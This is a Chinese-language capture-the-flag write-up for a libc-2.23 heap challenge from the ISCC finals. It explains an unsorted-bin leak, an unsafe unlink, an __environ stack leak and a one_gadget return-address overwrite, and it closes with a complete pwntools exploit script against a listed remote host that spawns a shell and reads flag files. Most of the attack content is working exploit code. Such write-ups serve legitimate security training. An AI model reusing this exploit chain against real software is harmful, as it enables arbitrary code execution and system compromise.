# ISCC 总决赛 PWN - combination 解题Writeup

## 题目信息

- **题目名称**: combination
- **题型**: PWN / Heap Exploitation
- **题目地址**: 39.96.193.120:10003
- **附件**: attachment-57 (1).zip
- **描述**: Sometimes you need to step onto someone else's ground.

---

## 一、程序分析

### 1.1 程序功能

程序名为 `combination_final`，是一个经典的 `tinypad` 类堆管理器，提供以下操作：

```
[*] COMMAND >>
A - 分配内存块 (Alloc/Add)
D - 释放内存块 (Delete)
E - 修改内存块 (Edit)
Q - 退出 (Quit)
```

程序维护了4个slot（索引1-4），每个slot可以存储用户数据。

### 1.2 保护机制

- LIBC版本：2.23（无tcache，经典unlink可利用）
-  binary自带tinypad全局结构体，位于 `tinypad + 0x108` 处存储slot1的content指针
- 关键点：`__environ` 符号可用于栈地址泄露

---

## 二、漏洞分析

### 2.1 UAF / Double-Free 类漏洞

程序在 `remove_entry` 后未清空指针，导致UAF（Use-After-Free）漏洞，可以用于：

- 泄露堆地址（通过unsorted bin fd/bk指针）
- 泄露libc地址（通过main_arena偏移）

### 2.2 Tinypad 全局数据区可控

通过构造 fake chunk 并触发 `unlink`，可以篡改 tinypad 全局变量区，从而获得**任意地址读写**能力。

### 2.3 栈地址泄露

通过任意读能力读取 `__environ` 的值，可以计算出 `main()` 函数的返回地址，进而覆写该地址为 `one_gadget`。

---

## 三、利用步骤详解

### Phase 1：泄露 Heap 基址和 Libc 基址

```python
def phase_heap_leak(p: tube):
    for marker in [b"A", b"B", b"C", b"D"]:
        store_entry(p, 0x80, marker * 8)

    remove_entry(p, 3)
    remove_entry(p, 1)
```

**步骤**：

1. 分配4个 `0x80` 大小的 chunk（实际大小 `0x90`，计入size字段）
2. 释放 chunk3 和 chunk1，使其进入 **unsorted bin**
3. unsorted bin 的 fd/bk 指针会指向 `main_arena+0x58`

**泄露原理**：

- 读取 slot1 的内容 → 得到 **heap 地址**（`heap_base = leak - 0x120`）
- 读取 slot3 的内容 → 得到 **main_arena 地址**

```python
heap_raw = extract_ptr(read_back(p, 1))
heap_base = heap_raw - 0x120

arena_raw = extract_ptr(read_back(p, 3))
main_arena_addr = arena_raw - UNSORTED_BIAS  # UNSORTED_BIAS = 0x58
libc.address = main_arena_addr - MAIN_ARENA_OFFSET  # __malloc_hook + 0x10
```

**结果**：成功获取 `heap_base`、`libc.address`

---

### Phase 2：Unsafe Unlink 篡改 Tinypad 全局区

```python
def phase_unsafe_unlink(p: tube, heap_base: int, arena_addr: int):
```

**目标**：通过 unlink 攻击，使 tinypad 全局区的 slot 指针指向可控区域，从而获得任意读写。

**步骤**：

1. 分配4个新 chunk，布局如下：

| Chunk | 大小 | 内容 |
|-------|------|------|
| chunk1 | 0x18 | `A*0x18` |
| chunk2 | 0x100 | `Y*0xF8 + p64(0x11)` |
| chunk3 | 0x100 | `Z*0xF8` |
| chunk4 | 0x100 | `W*0xF8` |

2. 在 chunk3（索引3，内容 `W`）中伪造 fake chunk 的 `prev_size` 和 `size` 字段：

```python
modify_entry(p, 3, b"W" * 0x20 + pack_words(0, 0x101, victim, victim))
```

其中 `victim = TINYPAD_GLOBAL + 0x20`，即 fake chunk 的地址。

3. 通过部分覆写（null byte poisoning）绕过 unlink 检查：

```python
delta = p64(heap_base + 0x20 - victim).rstrip(b"\x00")
for cut in range(nulls_needed + 1):
    modify_entry(p, 1, b"A" * 0x10 + delta.rjust(8 - cut, b"F"))
```

4. 释放 chunk2（索引2），触发 `unlink`：

```python
remove_entry(p, 2)
```

5. 此时 tinypad 全局区的指针已被篡改，再将其指向 `main_arena`，建立读写原语：

```python
modify_entry(p, 4, b"W" * 0x20 + pack_words(0, 0x101, arena_addr + UNSORTED_BIAS, arena_addr + UNSORTED_BIAS))
```

---

### Phase 3：栈地址泄露 + 任意地址写

```python
def phase_stack_overwrite(p: tube):
```

**步骤**：

1. 分配一个 `0xF0` 的 chunk，布局如下：

```python
store_entry(p, 0xF0,
    b"P" * 0xD0 + pack_words(
        0x80,                       # slot1 的 size
        libc.sym["__environ"],       # slot1 的 content_ptr → __environ
        0x18,                       # slot2 的 size
        SLOT1_CONTENT_PTR           # slot2 的 content_ptr
    )
)
```

2. 读取 slot1 的内容，得到 `__environ` 的值：

```python
environ_leak = extract_ptr(read_back(p, 1))
main_ret_addr = environ_leak - RET_OFFSET_FROM_ENVIRON  # 0xF0
```

**关键**：`__environ` 指向栈上 `environ` 变量的地址，`main()` 的返回地址在 `__environ - 0xF0` 处。

---

### Phase 4：写入 One Gadget 获取 Shell

```python
def fire_one_gadget(p: tube, ret_addr: int):
    gadget_addr = libc.address + OG_CANDIDATE  # 0xF1247

    constraint_loc = ret_addr + 8 + OG_CONSTRAINT_ARGV  # 0x78
    arb_write(p, constraint_loc, b"")   # 清空约束条件
    arb_write(p, ret_addr, p64(gadget_addr)[:6])

    send_cmd(p, b"Q")  # 触发 main 返回，执行 one_gadget
```

**任意写原语 `arb_write`**：

```python
def arb_write(p: tube, where: int, what: bytes) -> None:
    modify_entry(p, 2, p64(where)[:6])   # 修改 slot2 的 content_ptr
    modify_entry(p, 1, what)               # 向 where 地址写入 what
```

**One Gadget 约束绕过**：

- 选中的 gadget `0xF1247` 要求 `[rsp+0x78] == NULL`
- 通过任意写将原返回地址 + 0x80 处覆写为空，满足约束条件

---

### Phase 5：获取 Flag

```python
def pull_flag(io: tube) -> str:
    io.sendline(b"cat /flag* /home/*/flag* 2>/dev/null; exit")
    raw = io.recvrepeat(3).decode("latin-1", "replace")
    m = re.search(r"ISCC\{[^}]+\}", raw)
    return m.group(0)
```

程序退出时触发 `one_gadget`，拿到 shell 后读取 `/flag` 文件。

---

## 四、完整利用脚本

详见附件 `combination_solve.py`，核心流程：

```python
def main():
    io = create_connection()

    heap, arena = phase_heap_leak(io)           # 泄露堆和libc
    phase_unsafe_unlink(io, heap, arena)         # unlink篡改全局区
    ret = phase_stack_overwrite(io)              # 泄露栈地址
    fire_one_gadget(io, ret)                     # 写入one_gadget

    flag = pull_flag(io)
    print(f"[+] FLAG: {flag}")
```

---

## 五、关键偏移总结

| 符号/偏移 | 值 | 说明 |
|-----------|-----|------|
| `TINYPAD_GLOBAL` | `tinypad` 符号地址 | 全局结构体基址 |
| `SLOT1_CONTENT_PTR` | `TINYPAD_GLOBAL + 0x108` | slot1 内容指针位置 |
| `MAIN_ARENA_OFFSET` | `__malloc_hook + 0x10` | libc基址计算偏移 |
| `UNSORTED_BIAS` | `0x58` | main_arena 到 unsorted bin 头部偏移 |
| `OG_CANDIDATE` | `0xF1247` | libc-2.23 one_gadget 偏移 |
| `RET_OFFSET_FROM_ENVIRON` | `0xF0` | __environ 到 main 返回地址的偏移 |
| `OG_CONSTRAINT_ARGV` | `0x78` | one_gadget 约束条件地址偏移 |

---

## 六、总结

本题是一道高质量的堆利用综合题，融合了以下技巧：

1. **Unsorted Bin Leak** → 泄露 heap 和 libc 基址
2. **Unsafe Unlink** → 篡改全局指针，获得任意读写原语
3. **__environ Leak** → 泄露栈地址，定位 main 返回地址
4. **One Gadget** → 覆写返回地址，直接获取 shell

利用链清晰，每一步都很经典，是一道很好的 libc-2.23 堆利用练习题。

---

**FLAG格式**: `ISCC{06b8e23e-ac80-450b-8273-717baf7d0ee3}`




exp
```python
#没有文字 AI根据脚本生成吧
#!/usr/bin/env python3
import re
import sys
from pathlib import Path

from pwn import *

BINARY = "./combination_final"
LIBC = "./libc-2.23.so"
LD = "./ld-2.23.so"

SERVER_IP = "39.96.193.120"
SERVER_PORT = 10003

context.binary = elf = ELF(BINARY, checksec=False)
libc = ELF(LIBC, checksec=False)
context.log_level = "info"

TINYPAD_GLOBAL = elf.sym["tinypad"]
SLOT1_CONTENT_PTR = TINYPAD_GLOBAL + 0x108

MAIN_ARENA_OFFSET = libc.sym["__malloc_hook"] + 0x10
UNSORTED_BIAS = 0x58

OG_CANDIDATE = 0xF1247
RET_OFFSET_FROM_ENVIRON = 0xF0
OG_CONSTRAINT_ARGV = 0x78

def create_connection():
    if args.REMOTE:
        return remote(args.HOST or SERVER_IP, int(args.PORT or SERVER_PORT))
    ld_path = Path(LD)
    if ld_path.exists():
        return process([str(ld_path), "--library-path", ".", BINARY])
    return process(BINARY)

def prompt_for(p: tube, expected: bytes) -> None:
    p.recvuntil(expected)

def send_cmd(p: tube, letter: bytes) -> None:
    prompt_for(p, b"[*] COMMAND >> ")
    p.sendline(letter)

def store_entry(p: tube, sz: int, payload: bytes) -> None:
    send_cmd(p, b"A")
    prompt_for(p, b"[*] MEM_SIZE >> ")
    p.sendline(str(sz).encode())
    p.sendafter(b"[*] MEM_DATA >> ", payload + b"\n")

def remove_entry(p: tube, idx: int) -> None:
    send_cmd(p, b"D")
    prompt_for(p, b"[*] INDEX_ID >> ")
    p.sendline(str(idx).encode())

def modify_entry(p: tube, idx: int, payload: bytes) -> None:
    send_cmd(p, b"E")
    prompt_for(p, b"[*] INDEX_ID >> ")
    p.sendline(str(idx).encode())
    p.sendafter(b"[*] MEM_DATA >> ", payload + b"\n")
    prompt_for(p, b"[?] APPLY_CHANGE? (Y/n) >> ")
    p.sendline(b"Y")

def read_back(p: tube, idx: int) -> bytes:
    p.recvuntil(b" #   INDEX: %d\n # CONTENT: " % idx)
    return p.recvuntil(b"\n+------------------------------------------------------------------------------+", drop=True)

def extract_ptr(raw: bytes) -> int:
    return u64(raw.rstrip(b"\n")[:6].ljust(8, b"\x00"))

def pack_words(*vals: int) -> bytes:
    return b"".join(p64(v) for v in vals)

def phase_heap_leak(p: tube):
    """Alloc 4 chunks, free two to leak heap and libc via unsorted bin."""
    for marker in [b"A", b"B", b"C", b"D"]:
        store_entry(p, 0x80, marker * 8)

    remove_entry(p, 3)
    remove_entry(p, 1)

    heap_raw = extract_ptr(read_back(p, 1))
    heap_base = heap_raw - 0x120

    arena_raw = extract_ptr(read_back(p, 3))
    main_arena_addr = arena_raw - UNSORTED_BIAS
    libc.address = main_arena_addr - MAIN_ARENA_OFFSET

    log.info("heap_base   = %#x", heap_base)
    log.info("main_arena  = %#x", main_arena_addr)
    log.info("libc_base   = %#x", libc.address)

    remove_entry(p, 2)
    remove_entry(p, 4)

    return heap_base, main_arena_addr

def phase_unsafe_unlink(p: tube, heap_base: int, arena_addr: int):
    """Craft fake chunk overlapping tinypad globals, trigger unlink corruption."""
    store_entry(p, 0x18, b"X" * 0x18)
    store_entry(p, 0x100, b"Y" * 0xF8 + p64(0x11))
    store_entry(p, 0x100, b"Z" * 0xF8)
    store_entry(p, 0x100, b"W" * 0xF8)

    victim = TINYPAD_GLOBAL + 0x20

    modify_entry(p, 3, b"W" * 0x20 + pack_words(0, 0x101, victim, victim))

    delta = p64(heap_base + 0x20 - victim).rstrip(b"\x00")
    nulls_needed = 8 - len(delta)
    for cut in range(nulls_needed + 1):
        modify_entry(p, 1, b"A" * 0x10 + delta.rjust(8 - cut, b"F"))

    remove_entry(p, 2)

    modify_entry(p, 4, b"W" * 0x20 + pack_words(0, 0x101, arena_addr + UNSORTED_BIAS, arena_addr + UNSORTED_BIAS))

def phase_stack_overwrite(p: tube):
    """Install R/W primitive via tinypad metadata corruption, leak stack, write one_gadget to main's return addr."""
    store_entry(
        p,
        0xF0,
        b"P" * 0xD0 + pack_words(0x80, libc.sym["__environ"], 0x18, SLOT1_CONTENT_PTR),
    )

    environ_leak = extract_ptr(read_back(p, 1))
    main_ret_addr = environ_leak - RET_OFFSET_FROM_ENVIRON

    log.info("__environ   = %#x", environ_leak)
    log.info("main_ret    = %#x", main_ret_addr)

    return main_ret_addr

def arb_write(p: tube, where: int, what: bytes) -> None:
    modify_entry(p, 2, p64(where)[:6])
    modify_entry(p, 1, what)

def fire_one_gadget(p: tube, ret_addr: int):
    gadget_addr = libc.address + OG_CANDIDATE

    constraint_loc = ret_addr + 8 + OG_CONSTRAINT_ARGV
    arb_write(p, constraint_loc, b"")
    arb_write(p, ret_addr, p64(gadget_addr)[:6])

    log.info("one_gadget  = %#x", gadget_addr)
    send_cmd(p, b"Q")

def pull_flag(io: tube) -> str:
    io.sendline(b"cat /flag* /home/*/flag* 2>/dev/null; exit")
    raw = io.recvrepeat(3).decode("latin-1", "replace")
    m = re.search(r"ISCC\{[^}]+\}", raw)
    if not m:
        raise SystemExit("[-] flag not found in shell output")
    return m.group(0)

def main():
    io = create_connection()

    heap, arena = phase_heap_leak(io)
    phase_unsafe_unlink(io, heap, arena)
    ret = phase_stack_overwrite(io)
    fire_one_gadget(io, ret)

    flag = pull_flag(io)
    print(f"[+] FLAG: {flag}")

if __name__ == "__main__":
    main()

```

